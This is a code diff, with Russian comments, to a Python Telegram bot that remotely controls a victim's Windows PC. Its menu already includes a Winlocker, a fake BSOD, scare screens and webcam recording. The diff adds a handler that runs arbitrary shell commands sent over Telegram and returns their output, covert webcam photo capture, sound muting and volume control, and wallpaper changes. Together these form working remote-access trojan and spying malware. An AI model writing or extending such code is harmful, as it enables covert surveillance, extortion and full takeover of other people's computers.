@@ -10,6 +10,7 @@ import tkinter as tk
 from tkinter import messagebox
 import traceback
 import requests
+import cv2
 
 # Зависимости и соответствующие им имена модулей для импорта
 REQUIRED = {
@@ -147,15 +148,19 @@ def main_menu():
     markup.add("⌨️ Напечатать текст", "🖱 Переместить мышь")
     markup.add("💬 Сообщение", "🖥 Выключить ПК")
     markup.add("🔄 Перезагрузить ПК", "🔒 Заблокировать ПК")
-    markup.add("⛔ Отмена выключения", "⌨️ Горячие клавиши")
+    markup.add("⛔ Блокировка ввода", "⌨️ Горячие клавиши")
     markup.add("🖥 Системная информация", "👻 Скример")
     markup.add("Black screen", "Fake update")
     markup.add("Meme spam", "💀 Фейковый BSOD")
     markup.add("📹 Вебкамера 8 сек", "🚀 Поддержать автора")
     markup.add("▶️ Запустить Winlocker🔐", "⏹ Остановить WINLOCKER🔐")
     markup.add("📁 Список файлов", "📤 Отправить файл")
+    markup.add("📹 Вебкамера 8 сек", "📷 Фото с вебкамеры")  # добавлена кнопка фото с вебки
+    markup.add("🔇 Отключить звук", "🔊 Включить звук")
     markup.add("📥 Загрузить файл", "🎥 Скринкаст 10 сек")
-    markup.add("⏩ Обновить бота", "🛑 Остановить бота")
+    markup.add("🔊 Громкость 100%", "💻 Выполнить команду")
+    markup.add("🖼 Сменить обои", "⏩ Обновить бота")
+    markup.add("🔄 Перезапуск бота", "🛑 Остановить бота")
     return markup
 
 # --- Локальные функции (пример: black screen, fake update, meme spam) ---
@@ -224,6 +229,41 @@ def local_fake_update(duration=8, update_interval=0.5):
         root.mainloop()
 
     threading.Thread(target=_run, daemon=True).start()
+
+# ...existing code...
+@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "cmd_command")
+def execute_cmd_command(message):
+    try:
+        command = message.text.strip()
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+        # Если вывод большой — отправляем как файл
+        if len(result) > 3500:
+            import tempfile
+            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
+            tf.write(result)
+            tf.close()
+            with open(tf.name, "rb") as f:
+                bot.send_document(message.chat.id, f)
+            os.remove(tf.name)
+        else:
+            bot.send_message(message.chat.id, f"✅ Результат выполнения команды:\n{result}")
+    except subprocess.CalledProcessError as e:
+        out = e.output or str(e)
+        if len(out) > 3500:
+            import tempfile
+            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
+            tf.write(out)
+            tf.close()
+            with open(tf.name, "rb") as f:
+                bot.send_document(message.chat.id, f)
+            os.remove(tf.name)
+        else:
+            bot.send_message(message.chat.id, f"❌ Ошибка выполнения команды:\n{out}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+    finally:
+        user_state[message.chat.id] = None
+
 
 def local_meme_spam(folder=MEME_DIR, count=5, show_time=1.2):
     if not os.path.isdir(folder):
@@ -497,6 +537,33 @@ def start(message):
 
 PASSWORD = "5090"  # Set your unlock password here
 
+@bot.message_handler(func=lambda message: message.text == "🔊 Громкость 100%")
+def set_volume_max(message):
+    try:
+        ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)  # Устанавливаем громкость на максимум
+        bot.send_message(message.chat.id, "🔊 Громкость выставлена на 100%")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Не удалось изменить громкость: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "🖼 Сменить обои")
+def change_wallpaper_request(message):
+    bot.send_message(message.chat.id, "Отправьте изображение для установки в качестве обоев рабочего стола.")
+
+@bot.message_handler(content_types=["photo"])
+def set_wallpaper(message):
+    try:
+        file_info = bot.get_file(message.photo[-1].file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        wallpaper_path = os.path.join(BASE_DIR, "wallpaper.jpg")
+        with open(wallpaper_path, "wb") as f:
+            f.write(downloaded_file)
+
+        # Устанавливаем обои
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
+        bot.send_message(message.chat.id, "✅ Обои рабочего стола успешно изменены.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при установке обоев: {e}")
+
 @bot.message_handler(func=lambda message: True)
 def handle_buttons(message):
     global script_thread, script_stop_event  # <-- Add this line
@@ -510,6 +577,14 @@ def handle_buttons(message):
         screenshot.save(path)
         with open(path, "rb") as img:
             bot.send_photo(message.chat.id, img)
+
+    # --- Добавлена обработка команды для выполнения в CMD ---
+    elif message.text == "💻 Выполнить команду":
+        if message.chat.id != ADMIN_ID:
+            bot.send_message(message.chat.id, "⛔ У вас нет прав для выполнения этой команды.")
+            return
+        bot.send_message(message.chat.id, "Введите команду для выполнения (будет выполнена в shell):")
+        user_state[message.chat.id] = "cmd_command"
 
     elif message.text == "Fake update":
         bot.send_message(message.chat.id, "Фейк апдейт запущен!")
@@ -676,6 +751,46 @@ def handle_buttons(message):
             pass
         bot.send_message(message.chat.id, "👻 Скример сработал!")
 
+    elif message.text == "🔊 Включить звук":
+        try:
+            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
+            bot.send_message(message.chat.id, "🔊 Звук включён (громкость 100%)")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"⚠️ Не удалось включить звук: {e}")\
+                
+    elif message.text == "🔇 Отключить звук":
+        try:
+            # Устанавливаем громкость на 0 (влияет на waveOut устройства)
+            ctypes.windll.winmm.waveOutSetVolume(0, 0x0000)
+            bot.send_message(message.chat.id, "🔇 Звук отключён (громкость 0%)")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"⚠️ Не удалось отключить звук: {e}")
+
+    elif message.text == "📷 Фото с вебкамеры":
+        try:
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                bot.send_message(message.chat.id, "❌ Не удалось открыть веб-камеру")
+            else:
+                ret, frame = cap.read()
+                cap.release()
+                if not ret:
+                    bot.send_message(message.chat.id, "❌ Не удалось получить кадр с веб-камеры")
+                else:
+                    import tempfile
+                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".jpg")
+                    tmp_name = tmp.name
+                    tmp.close()
+                    cv2.imwrite(tmp_name, frame)
+                    with open(tmp_name, "rb") as img:
+                        bot.send_photo(message.chat.id, img)
+                    try:
+                        os.remove(tmp_name)
+                    except Exception:
+                        pass
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ Ошибка при съёмке: {e}")
+
     elif message.text == "📹 Вебкамера 8 сек":
         bot.send_message(message.chat.id, "Запись вебкамеры...")
         filename = "webcam.mp4"
@@ -684,7 +799,7 @@ def handle_buttons(message):
                 bot.send_video(message.chat.id, vid)
         else:
             bot.send_message(message.chat.id, "❌ Не удалось записать видео")
-
+            
     elif message.text == "🔊 Громкость 100%":
         try:
             devices = ctypes.windll.winmm.waveOutGetNumDevs()
